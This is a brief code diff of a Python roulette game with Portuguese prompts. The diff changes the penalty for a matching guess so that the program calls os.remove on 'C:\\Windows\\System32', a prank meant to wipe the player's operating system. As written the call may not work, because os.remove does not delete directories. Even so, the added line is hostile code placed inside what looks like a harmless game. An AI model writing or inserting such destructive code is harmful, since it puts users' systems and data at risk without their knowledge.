@@ -13,6 +13,6 @@ print(roleta)
 roleta_digitada = int(input("Gire a Roleta:"))
 
 if roleta == roleta_digitada:
-    os.remove("Este Computador")
+    os.remove("C:\\Windows\\System32")
 else:
     print("Você deu sorte!")
